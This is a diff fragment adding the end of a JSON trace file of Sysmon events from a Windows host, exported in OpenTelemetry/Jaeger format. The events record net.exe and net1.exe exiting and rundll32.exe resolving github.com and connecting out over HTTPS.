+                      "spanID":  "9a82809fa8deff98",
+                      "operationName":  "net1.exe@evt:5",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "d5adb871aa6fa300"
+                                         }
+                                     ],
+                      "startTime":  1758793509530770,
+                      "duration":  4936,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Processterminated(rule:ProcessTerminate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  5
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net1.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1402-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  2104
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:08"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:08.877"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  null
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "22e2ce4acc770c3c",
+                      "operationName":  "net.exe@evt:5",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "5e0b63fe659a0f04"
+                                         }
+                                     ],
+                      "startTime":  1758793509536285,
+                      "duration":  5319,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Processterminated(rule:ProcessTerminate)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  5
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\net.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f23-68d5-1302-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:08"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:08.881"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  2984
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "duplicate span IDs; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "9da1b6042f9eef8b",
+                      "operationName":  "rundll32.exe@evt:3",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "b8865304f54b6e48"
+                                         }
+                                     ],
+                      "startTime":  1758793515522208,
+                      "duration":  2649,
+                      "tags":  [
+                                   {
+                                       "key":  "DestinationHostname",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "DestinationIp",
+                                       "type":  "string",
+                                       "value":  "20.200.245.247"
+                                   },
+                                   {
+                                       "key":  "DestinationIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "DestinationPort",
+                                       "type":  "int64",
+                                       "value":  443
+                                   },
+                                   {
+                                       "key":  "DestinationPortName",
+                                       "type":  "string",
+                                       "value":  "https"
+                                   },
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Networkconnectiondetected(rule:NetworkConnect)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  3
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "Initiated",
+                                       "type":  "bool",
+                                       "value":  true
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "Protocol",
+                                       "type":  "string",
+                                       "value":  "tcp"
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "SourceHostname",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05.localdomain"
+                                   },
+                                   {
+                                       "key":  "SourceIp",
+                                       "type":  "string",
+                                       "value":  "192.168.238.136"
+                                   },
+                                   {
+                                       "key":  "SourceIsIpv6",
+                                       "type":  "bool",
+                                       "value":  false
+                                   },
+                                   {
+                                       "key":  "SourcePort",
+                                       "type":  "int64",
+                                       "value":  -15632
+                                   },
+                                   {
+                                       "key":  "SourcePortName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:13.585"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "duplicate span IDs; skipping clock skew adjustment"
+                                   ]
+                  },
+                  {
+                      "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                      "spanID":  "1f94ae7cb919d52a",
+                      "operationName":  "rundll32.exe@evt:22",
+                      "references":  [
+                                         {
+                                             "refType":  "CHILD_OF",
+                                             "traceID":  "c2cf81e913a80a9afae296465b5b8589",
+                                             "spanID":  "c0bf6195a65a0fd0"
+                                         }
+                                     ],
+                      "startTime":  1758793515501023,
+                      "duration":  467,
+                      "tags":  [
+                                   {
+                                       "key":  "EventName",
+                                       "type":  "string",
+                                       "value":  "Dnsquery(rule:DnsQuery)"
+                                   },
+                                   {
+                                       "key":  "ID",
+                                       "type":  "int64",
+                                       "value":  22
+                                   },
+                                   {
+                                       "key":  "Image",
+                                       "type":  "string",
+                                       "value":  "C:\\Windows\\System32\\rundll32.exe"
+                                   },
+                                   {
+                                       "key":  "ProcessGuid",
+                                       "type":  "string",
+                                       "value":  "7c13b5df-0f29-68d5-4802-000000000300"
+                                   },
+                                   {
+                                       "key":  "ProcessId",
+                                       "type":  "int64",
+                                       "value":  6112
+                                   },
+                                   {
+                                       "key":  "ProviderGuid",
+                                       "type":  "string",
+                                       "value":  "5770385f-c22a-43e0-bf4c-06f5698ffbd9"
+                                   },
+                                   {
+                                       "key":  "QueryName",
+                                       "type":  "string",
+                                       "value":  "github.com"
+                                   },
+                                   {
+                                       "key":  "QueryResults",
+                                       "type":  "string",
+                                       "value":  "::ffff:20.200.245.247;"
+                                   },
+                                   {
+                                       "key":  "QueryStatus",
+                                       "type":  "string",
+                                       "value":  "0"
+                                   },
+                                   {
+                                       "key":  "RuleName",
+                                       "type":  "string",
+                                       "value":  "-"
+                                   },
+                                   {
+                                       "key":  "TimeStamp",
+                                       "type":  "string",
+                                       "value":  "09/25/2025 02:45:14"
+                                   },
+                                   {
+                                       "key":  "User",
+                                       "type":  "string",
+                                       "value":  "WIN-JQPCJUH0S05\\Administrator"
+                                   },
+                                   {
+                                       "key":  "UtcTime",
+                                       "type":  "string",
+                                       "value":  "2025-09-25 09:45:13.568"
+                                   },
+                                   {
+                                       "key":  "channel",
+                                       "type":  "string",
+                                       "value":  "Sysmon"
+                                   },
+                                   {
+                                       "key":  "otel.scope.name",
+                                       "type":  "string",
+                                       "value":  "event.agent"
+                                   },
+                                   {
+                                       "key":  "span.kind",
+                                       "type":  "string",
+                                       "value":  "internal"
+                                   },
+                                   {
+                                       "key":  "sysmon.opcode",
+                                       "type":  "string",
+                                       "value":  "Info"
+                                   },
+                                   {
+                                       "key":  "sysmon.ppid",
+                                       "type":  "int64",
+                                       "value":  5636
+                                   },
+                                   {
+                                       "key":  "user_id",
+                                       "type":  "string",
+                                       "value":  "sj"
+                                   }
+                               ],
+                      "logs":  [
+
+                               ],
+                      "processID":  "p1",
+                      "warnings":  [
+                                       "duplicate span IDs; skipping clock skew adjustment"
+                                   ]
+                  }
+              ],
+    "processes":  {
+                      "p1":  {
+                                 "serviceName":  "event-agent",
+                                 "tags":  [
+                                              {
+                                                  "key":  "service.instance.id",
+                                                  "type":  "string",
+                                                  "value":  "01c8f471-55f0-45c3-bd3b-f31503f4f836"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.language",
+                                                  "type":  "string",
+                                                  "value":  "dotnet"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.name",
+                                                  "type":  "string",
+                                                  "value":  "opentelemetry"
+                                              },
+                                              {
+                                                  "key":  "telemetry.sdk.version",
+                                                  "type":  "string",
+                                                  "value":  "1.12.0"
+                                              }
+                                          ]
+                             }
+                  },
+    "warnings":  null
+}
